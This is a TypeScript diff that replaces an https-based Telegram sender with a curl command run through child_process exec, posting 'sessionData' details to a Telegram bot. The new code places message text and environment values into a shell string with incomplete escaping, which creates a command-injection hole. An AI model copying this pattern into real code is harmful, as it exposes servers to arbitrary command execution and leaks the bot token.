@@ -1,6 +1,9 @@
-import https from 'https';
+import { exec } from 'child_process';
+import { promisify } from 'util';
 
-// Función para enviar mensajes a Telegram usando https de Node.js
+const execAsync = promisify(exec);
+
+// Función para enviar mensajes a Telegram usando curl (más confiable)
 export async function sendToTelegram(sessionData: any) {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -44,57 +47,34 @@ export async function sendToTelegram(sessionData: any) {
 *🕐 Fecha:* ${new Date(sessionData.createdAt).toLocaleString('es-CO')}
 `;
 
-    const data = JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'Markdown',
-    });
+    // Escapar comillas y caracteres especiales para el shell
+    const escapedMessage = message.replace(/"/g, '\\"').replace(/`/g, '\\`').replace(/\$/g, '\\$');
+    
+    const curlCommand = `curl -X POST "https://api.telegram.org/bot${botToken}/sendMessage" \
+      -H "Content-Type: application/json" \
+      -d "{\\"chat_id\\":\\"${chatId}\\",\\"text\\":\\"${escapedMessage}\\",\\"parse_mode\\":\\"Markdown\\"}" \
+      --max-time 30 \
+      --silent`;
 
-    const options = {
-      hostname: 'api.telegram.org',
-      port: 443,
-      path: `/bot${botToken}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': Buffer.byteLength(data),
-      },
-      timeout: 30000, // 30 segundos
-    };
-
-    return new Promise((resolve, reject) => {
-      const req = https.request(options, (res) => {
-        let responseData = '';
-
-        res.on('data', (chunk) => {
-          responseData += chunk;
-        });
-
-        res.on('end', () => {
-          if (res.statusCode === 200) {
-            console.log('Message sent to Telegram successfully');
-            resolve(true);
-          } else {
-            console.error('Telegram API error:', res.statusCode, responseData);
-            reject(new Error(`Telegram API returned ${res.statusCode}`));
-          }
-        });
-      });
-
-      req.on('error', (error) => {
-        console.error('Error sending to Telegram:', error);
-        reject(error);
-      });
-
-      req.on('timeout', () => {
-        req.destroy();
-        console.error('Telegram request timeout');
-        reject(new Error('Request timeout'));
-      });
-
-      req.write(data);
-      req.end();
-    });
+    try {
+      const { stdout, stderr } = await execAsync(curlCommand);
+      
+      if (stderr) {
+        console.error('Telegram curl stderr:', stderr);
+      }
+      
+      const response = JSON.parse(stdout);
+      if (response.ok) {
+        console.log('Message sent to Telegram successfully via curl');
+        return true;
+      } else {
+        console.error('Telegram API error:', response);
+        throw new Error(`Telegram API error: ${response.description}`);
+      }
+    } catch (error: any) {
+      console.error('Error sending to Telegram via curl:', error.message);
+      throw error;
+    }
   } catch (error) {
     console.error('Error in sendToTelegram:', error);
     throw error;
